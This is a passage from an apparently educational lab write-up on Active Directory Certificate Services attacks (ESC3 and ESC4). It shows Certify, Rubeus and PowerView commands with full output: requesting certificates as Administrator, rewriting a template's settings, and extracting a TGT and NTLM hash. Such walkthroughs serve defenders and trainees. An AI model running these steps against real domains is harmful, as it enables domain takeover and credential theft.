<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIF0DCCBLigAwIBAgITPgAAABNRLiF</span><span class="o">+</span><span class="n">zHF0vAAAAAAAEzANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">Kh1</span><span class="o">/</span><span class="mi">2</span><span class="n">ecllx02ioAnWOZsWV</span><span class="o">/</span><span class="n">siOtzvB565spQ8BUL9LIS9Fc</span><span class="o">+</span>
<span class="n">mGtna0lkeB6WNwAfrIc7YhN5GtS17l1VgBWczGARIzBIJ0Nm2s</span><span class="o">/</span><span class="n">hUaMAN5o6mvVt</span>
<span class="n">pla</span><span class="o">/</span><span class="n">ng</span><span class="o">==</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>
</pre></div>
<p>Once we have obtained the certificate, the next step is to convert it to <code>PFX</code> format. Since this process is identical to what we did in <code>ESC1</code>, we won’t go into detail here. After converting the certificate, it must be uploaded to the target machine.</p><br/>
<p>As previously explained, a certificate with the <strong>Certificate Request Agent EKU</strong> allows us to <strong>co-sign</strong> another certificate request, effectively enrolling for a certificate on behalf of any user. In this scenario, we will leverage the <strong>User</strong> template to request a certificate for the <strong>Administrator</strong> account. To achieve this, we specify the target user using the <code>/onbehalfof</code> parameter. Additionally, we need to supply the certificate that grants us this capability, which is provided via the <code>/enrollcert</code> parameter:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">request</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span> <span class="o">/</span><span class="n">onbehalfof</span><span class="p">:</span><span class="n">ELSWIXCORP</span>\<span class="n">administrator</span> <span class="o">/</span><span class="n">enrollcert</span><span class="p">:</span><span class="n">enrollcert</span><span class="o">.</span><span class="n">pfx</span> 

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">User</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">On</span> <span class="n">Behalf</span> <span class="n">Of</span>            <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">administrator</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">certificate</span> <span class="n">had</span> <span class="n">been</span> <span class="n">issued</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">20</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEogIBAAKCAQEAlLm1oDuRXOc7M7xoJMuoTr1Y7VSSkEAUpcKJDFzo2p16nsrF</span>
<span class="n">yxAjHFXHd8oI1ddszi9YwsrmZ6Y4xLgvKxTnt</span><span class="o">/</span><span class="n">X3sVY0XwYyCHVMWRQ</span><span class="o">/</span><span class="mi">0</span><span class="n">Ffjrt1B</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">gS</span><span class="o">/</span><span class="n">mecPnzlavrf7MZlUb0BhLrn</span>
<span class="n">aPwHK3hUnXj7EG5y2r9TLCmWUeAtHVivRyrzSTw6FLNyFcFr5us</span><span class="o">=</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIF9DCCBNygAwIBAgITPgAAABSarilGVhFvcAAAAAAAFDANBgkqhkiG9w0BAQsF</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">DnUoAs7R3xVBR1PMQ</span><span class="o">/</span><span class="n">Qw2JqBVQicnEEu9xa2ng8</span>
<span class="n">u</span><span class="o">+</span><span class="n">xEoh</span><span class="o">+</span><span class="mi">3</span><span class="n">eAIO5dimdNQtHwvuAH8WQHTRghSy7O0dtkBwpQ65KbuIfuQx3iWvprAV</span>
<span class="mi">9</span><span class="n">fkevjHR</span><span class="o">/</span><span class="n">u4pGQ1vocaTZT</span><span class="o">+</span><span class="mi">68</span><span class="n">X</span><span class="o">+</span><span class="mi">7</span><span class="n">RjS8OxR4Zgllij49OqbyzR4oIQ</span><span class="o">==</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">03.6738651</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>Excellent! We've successfully obtained a certificate for the <strong>Administrator</strong> account. The next step is to convert this certificate to <code>PFX</code> format, allowing us to use it for authentication.</p><br/>
<p>Once converted, we can leverage <strong>PKINIT Kerberos authentication</strong> using <code>Rubeus.exe</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Rubeus</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span> <span class="o">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">administrator</span><span class="o">.</span><span class="n">pfx</span> <span class="o">/</span><span class="n">getcredentials</span> 

   <span class="n">______</span>        <span class="n">_</span>
  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>

  <span class="n">v2</span><span class="mf">.3.3</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">PKINIT</span> <span class="k">with</span> <span class="n">etype</span> <span class="n">rc4_hmac</span> <span class="ow">and</span> <span class="n">subject</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Administrator</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">PKINIT</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local</span><span class="se">\a</span><span class="s1">dministrator'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">8486</span><span class="p">:</span><span class="mi">53</span><span class="n">c9</span><span class="p">:</span><span class="mi">7</span><span class="n">ec5</span><span class="p">:</span><span class="mi">93</span><span class="n">ed</span><span class="o">%</span><span class="mi">5</span><span class="p">:</span><span class="mi">88</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>

      <span class="n">doIGjDCCBoigAwIBBaEDAgEWooIFkDCCBYxhggWIMIIFhKADAgEFoRIbEEVMU1dJWENPUlAuTE</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">FNXSVhDT1JQLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBlbHN3aXhjb3JwLmxvY2Fs</span>

  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">administrator</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">10</span> <span class="n">PM</span>
  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">8</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">10</span> <span class="n">AM</span>
  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">4</span><span class="o">/</span><span class="mi">4</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">10</span> <span class="n">PM</span>
  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">rc4_hmac</span>
  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="n">uju555q05LRTqDFqdb0Lng</span><span class="o">==</span>
  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">9508</span><span class="n">DE096CEAFA3697F2964493312A0B</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">credentials</span> <span class="n">using</span> <span class="n">U2U</span>

  <span class="n">CredentialInfo</span>         <span class="p">:</span>
    <span class="n">Version</span>              <span class="p">:</span> <span class="mi">0</span>
    <span class="n">EncryptionType</span>       <span class="p">:</span> <span class="n">rc4_hmac</span>
    <span class="n">CredentialData</span>       <span class="p">:</span>
      <span class="n">CredentialCount</span>    <span class="p">:</span> <span class="mi">1</span>
       <span class="n">NTLM</span>              <span class="p">:</span> <span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span>
</pre></div>
<p>By doing this, we authenticate as the <strong>Administrator</strong> user, and since the certificate is trusted, the authentication process completes successfully. As a result, we've not only gained access as the <strong>Administrator</strong>, but we've also extracted the <strong>NT hash</strong> leveraging U2U.</p><br/>
<h3>Vulnerable Certificate Template Access Control (ESC4)</h3><br/>
<p><strong>ESC4</strong> exploits misconfigured <strong>DACL (Discretionary Access Control List)</strong> settings on certificate templates, where low-privileged users have <strong>write</strong> permissions. If a user has <strong>write</strong> access to a template, they can modify critical settings, such as how the <strong>Subject Name</strong> field is handled in issued certificates, or modify its <strong>EKUs</strong>.</p><br/>
<p>One particularly dangerous modification is enabling the <strong>Supply in Request</strong> option, which allows the requester to specify an arbitrary <strong>Subject Alternative Name (SAN)</strong>. This misconfiguration opens the door for privilege escalation, as an attacker could request a certificate with a SAN matching a privileged account, such as <strong>Administrator</strong>, and use it for authentication. Similar to what we did in <code>ESC1</code>.</p><br/>
<p>Essentially, if a template is vulnerable to <strong>ESC4</strong>, you can make it vulnerable to <strong>ESC1</strong> by modifying the template settings.</p><br/>
<p>For this scenario, I created a template called <code>ESC4</code>, which grants write permissions to <strong>Domain Users</strong>. This misconfiguration can be found using <code>Certify.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">find</span> <span class="o">/</span><span class="n">vulnerable</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Vulnerable</span> <span class="n">Certificates</span> <span class="n">Templates</span> <span class="p">:</span>

    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">ESC4</span>
    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="mi">2</span>
    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="mi">1</span> <span class="n">year</span>
    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
    <span class="n">msPKI</span><span class="o">-</span><span class="n">Certificate</span><span class="o">-</span><span class="n">Name</span><span class="o">-</span><span class="n">Flag</span>          <span class="p">:</span> <span class="n">SUBJECT_ALT_REQUIRE_UPN</span><span class="p">,</span> <span class="n">SUBJECT_REQUIRE_DIRECTORY_PATH</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">enrollment</span><span class="o">-</span><span class="n">flag</span>                 <span class="p">:</span> <span class="n">AUTO_ENROLLMENT</span>
    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="mi">0</span>
    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Code</span> <span class="n">Signing</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">certificate</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">policy</span>  <span class="p">:</span> <span class="n">Code</span> <span class="n">Signing</span>
    <span class="n">Permissions</span>
      <span class="n">Enrollment</span> <span class="n">Permissions</span>
        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Users</span>       <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">513</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">500</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Users</span>       <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">513</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>



<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">13.1638410</span>
</pre></div>
<p>As observed, <strong>Domain Users</strong> have <code>WriteProperty</code> privileges on <code>ESC4</code>. Now, let's reproduce the attack.</p><br/>
<p>The <code>ESC4</code> template has the <strong>Code Signing</strong> EKU, which does not allow us to use it for authentication. Moreover, the <strong>Supply in Request</strong> option is not enabled, so, in principle, it's not exploitable. However, as we have write permissions on it, we can modify such configurations or add new ones.</p><br/>
<p>To modify this template, I'll use the <strong>PowerView.ps1</strong> script, which is great for this purpose. First, I'll enable the option <strong>Supply in Request</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">Set</span><span class="o">-</span><span class="n">DomainObject</span> <span class="o">-</span><span class="n">SearchBase</span> <span class="s2">"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=elswixcorp,DC=local"</span> <span class="o">-</span><span class="n">Identity</span> <span class="n">ESC4</span> <span class="o">-</span><span class="n">XOR</span> <span class="o">@</span><span class="p">{</span><span class="s1">'mspki-certificate-name-flag'</span><span class="o">=</span><span class="mi">1</span><span class="p">}</span> <span class="o">-</span><span class="n">Verbose</span>
<span class="n">Verbose</span><span class="p">:</span> <span class="p">[</span><span class="n">Get</span><span class="o">-</span><span class="n">DomainSearcher</span><span class="p">]</span> <span class="n">search</span> <span class="n">base</span><span class="p">:</span> <span class="n">LDAP</span><span class="p">:</span><span class="o">//</span><span class="n">CN</span><span class="o">=</span><span class="n">Certificate</span> <span class="n">Templates</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Public</span> <span class="n">Key</span> <span class="n">Services</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">Verbose</span><span class="p">:</span> <span class="p">[</span><span class="n">Get</span><span class="o">-</span><span class="n">DomainObject</span><span class="p">]</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainObject</span> <span class="nb">filter</span> <span class="n">string</span><span class="p">:</span> <span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">samAccountName</span><span class="o">=</span><span class="n">ESC4</span><span class="p">)(</span><span class="n">name</span><span class="o">=</span><span class="n">ESC4</span><span class="p">)(</span><span class="n">displayname</span><span class="o">=</span><span class="n">ESC4</span><span class="p">))))</span>
<span class="n">Verbose</span><span class="p">:</span> <span class="p">[</span><span class="n">Set</span><span class="o">-</span><span class="n">DomainObject</span><span class="p">]</span> <span class="n">XORing</span> <span class="s1">'mspki-certificate-name-flag'</span> <span class="k">with</span> <span class="s1">'1'</span> <span class="k">for</span> <span class="nb">object</span> <span class="s1">''</span>
</pre></div>
<p>Great, it worked. Now, let's add the <strong>Client Authentication</strong> EKU:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">Set</span><span class="o">-</span><span class="n">DomainObject</span> <span class="o">-</span><span class="n">SearchBase</span> <span class="s2">"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=elswixcorp,DC=local"</span> <span class="o">-</span><span class="n">Identity</span> <span class="n">ESC4</span> <span class="o">-</span><span class="n">Set</span> <span class="o">@</span><span class="p">{</span><span class="s1">'mspki-certificate-application-policy'</span><span class="o">=</span><span class="s1">'1.3.6.1.5.5.7.3.2'</span><span class="p">}</span> <span class="o">-</span><span class="n">Verbose</span>
<span class="n">Verbose</span><span class="p">:</span> <span class="p">[</span><span class="n">Get</span><span class="o">-</span><span class="n">DomainSearcher</span><span class="p">]</span> <span class="n">search</span> <span class="n">base</span><span class="p">:</span> <span class="n">LDAP</span><span class="p">:</span><span class="o">//</span><span class="n">CN</span><span class="o">=</span><span class="n">Certificate</span> <span class="n">Templates</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Public</span> <span class="n">Key</span> <span class="n">Services</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">Verbose</span><span class="p">:</span> <span class="p">[</span><span class="n">Get</span><span class="o">-</span><span class="n">DomainObject</span><span class="p">]</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainObject</span> <span class="nb">filter</span> <span class="n">string</span><span class="p">:</span> <span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">samAccountName</span><span class="o">=</span><span class="n">ESC4</span><span class="p">)(</span><span class="n">name</span><span class="o">=</span><span class="n">ESC4</span><span class="p">)(</span><span class="n">displayname</span><span class="o">=</span><span class="n">ESC4</span><span class="p">))))</span>
<span class="n">Verbose</span><span class="p">:</span> <span class="p">[</span><span class="n">Set</span><span class="o">-</span><span class="n">DomainObject</span><span class="p">]</span> <span class="n">Setting</span> <span class="s1">'mspki-certificate-application-policy'</span> <span class="n">to</span> <span class="s1">'1.3.6.1.5.5.7.3.2'</span> <span class="k">for</span> <span class="nb">object</span> <span class="s1">''</span>
</pre></div>
<p>Excellent, now the <strong>ESC4</strong> template can be abused the same way as <strong>ESC1</strong>. Because we made it vulnerable to <strong>ESC1</strong>.</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">request</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="n">ESC4</span> <span class="o">/</span><span class="n">altname</span><span class="p">:</span><span class="n">administrator</span>

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
